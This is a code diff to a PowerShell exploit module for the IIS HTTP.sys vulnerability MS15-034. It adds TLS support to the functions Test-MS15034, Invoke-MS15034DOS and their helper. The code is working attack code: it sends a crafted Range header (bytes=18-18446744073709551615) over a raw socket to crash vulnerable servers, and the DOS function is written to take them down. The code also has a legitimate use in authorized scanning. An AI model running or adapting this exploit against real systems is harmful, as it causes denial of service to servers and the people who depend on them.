@@ -16,7 +16,10 @@ Function Test-MS15034
         [Switch]$Windows2012,
 
         [Parameter(Mandatory = $True, ParameterSetName = 'ServerPath')]
-        [string]$ServerPath
+        [string]$ServerPath,
+
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseSSL
     )
         
     if ($PSCmdlet.ParameterSetName -eq 'Windows2008')
@@ -24,13 +27,14 @@ Function Test-MS15034
     elseif ($PSCmdlet.ParameterSetName -eq 'Windows2012')
     { $SrvPath = '/IIS-85.png' }
     elseif ($PSCmdlet.ParameterSetName -eq 'ServerPath')
-    { $SrvPath = $ServerPath }
+    { $SrvPath = $ServerPath }   
 
     try
-    { $Result = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 0 -UpperRange 18446744073709551615 }
+    { $Result = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 0 -UpperRange 18446744073709551615 -UseSSL:$UseSSL }
     catch
-    { Throw ('An error occured during the connection to http://{0}:{1}{2}' -f $Computer, $Port, $SrvPath) }
-     
+    #{ Throw ('An error occured during the connection to http://{0}:{1}{2}' -f $Computer, $Port, $SrvPath) }
+    { throw $_ }
+
     Write-Verbose -Message $Result
 
     if (-not $Result.contains('Server: Microsoft'))
@@ -61,7 +65,10 @@ Function Invoke-MS15034DOS
         [Switch]$Windows2012,
 
         [Parameter(Mandatory = $True, ParameterSetName = 'ServerPath')]
-        [string]$ServerPath
+        [string]$ServerPath,
+
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseSSL
     )
 
     if ($PSCmdlet.ParameterSetName -eq 'Windows2008')
@@ -73,7 +80,7 @@ Function Invoke-MS15034DOS
 
     # Test to see if the server is vulnerable
     try
-    { $TestResults = Test-MS15034 -Computer $Computer -Port $Port -ServerPath $SrvPath }
+    { $TestResults = Test-MS15034 -Computer $Computer -Port $Port -ServerPath $SrvPath -UseSSL:$UseSSL }
     catch
     { Throw ('An error occured during the connection to http://{0}:{1}{2}' -f $Computer, $Port, $SrvPath) }
 
@@ -82,7 +89,7 @@ Function Invoke-MS15034DOS
     {
         'The server is vulnerable, performing Denial Of Service'
         try
-        { $null = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 18 -UpperRange 18446744073709551615 }
+        { $null = Invoke-MS15034Helper -Computer $Computer -Port $Port -Path $SrvPath -LowerRange 18 -UpperRange 18446744073709551615 -UseSSL:$UseSSL }
         catch
         {
             if ($_.Exception.InnerException.Message.Contains('A connection attempt failed because the connected party did not properly respond'))
@@ -112,7 +119,11 @@ Function Invoke-MS15034Helper
         [String]$LowerRange,
 
         [Parameter(Mandatory = $True)]
-        [String]$UpperRange
+        [String]$UpperRange,
+
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseSSL
+
     )
 
     $HTTPRequest = "GET {0} HTTP/1.1`r`nHost: stuff`r`nRange: bytes={1}-{2}`r`n`r`n" -f $Path, $LowerRange, $UpperRange
@@ -126,8 +137,19 @@ Function Invoke-MS15034Helper
     $TCPClient = New-Object -TypeName System.Net.Sockets.TcpClient -ArgumentList ($Computer, $Port)
     $TCPClient.ReceiveBufferSize = $TCPClientRBSize    
     
-    #Get a Stream from the TCPClient
-    $TCPStream = $TCPClient.GetStream()
+    if ($UseSSL)
+    {
+        $TCPStream = New-Object -TypeName System.Net.Security.SslStream -ArgumentList ($TCPClient.GetStream())
+        try 
+        { $TCPStream.AuthenticateAsClient($computer) }
+        catch
+        { throw 'An SSL Error occured' }
+    }
+    else
+    {
+        #Get a Stream from the TCPClient
+        $TCPStream = $TCPClient.GetStream()
+    }
     
     #write the encoded request to the TCP Stream
     $TCPStream.Write($EncodedRequest,0,$EncodedRequest.Length)
